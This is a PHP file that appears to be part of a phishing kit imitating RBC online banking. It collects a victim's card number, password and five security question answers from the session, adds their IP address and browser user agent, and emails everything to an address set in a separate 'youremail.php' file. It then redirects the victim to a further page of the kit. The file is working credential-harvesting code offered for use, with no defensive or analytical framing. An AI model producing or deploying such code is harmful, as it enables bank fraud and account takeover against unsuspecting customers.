<?php
session_start();
include "youremail.php";
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");

$cn = $_SESSION['K1'];
$pass = $_SESSION['Q1'];

$q1 = $_SESSION['q1'];
$a1= $_SESSION['a1'];

$q2 = $_SESSION['q2'];
$a2= $_SESSION['a2'];

$q3 = $_SESSION['q3'];
$a3= $_SESSION['a3'];

$q4 = $_SESSION['q4'];
$a4= $_SESSION['a4'];

$q5 = $_SESSION['q5'];
$a5= $_SESSION['a5'];

$data ="
    =============## RBC Q/A ##==================
    |CardNo : $cn
    |PASS : $pass 
	--------------------------------------------
	|Q1: $q1
	|A1: $a1 
	
	|Q2:	$q2
	|A2:	$a2
	
	|Q3: $q3
	|A3: $a3
	
	|Q4: $q4
	|A4: $a4
	
	|Q5: $q5
	|A5: $a5
	
    ============## loloz :) ##=======================
    IP : $ip
    UA : $browserAgent
    Time : $timedate
    ";

$a1 = $_SESSION['a1'];
$a2 = $_SESSION['a2'];
$subject = "RBC Q/A $ip";
if(strlen($a1) <= 14 && strlen($a1) >= 2 ){

mail($send,$subject,$data);


}
	
		   header("Location: eaccess.php");

	 
?>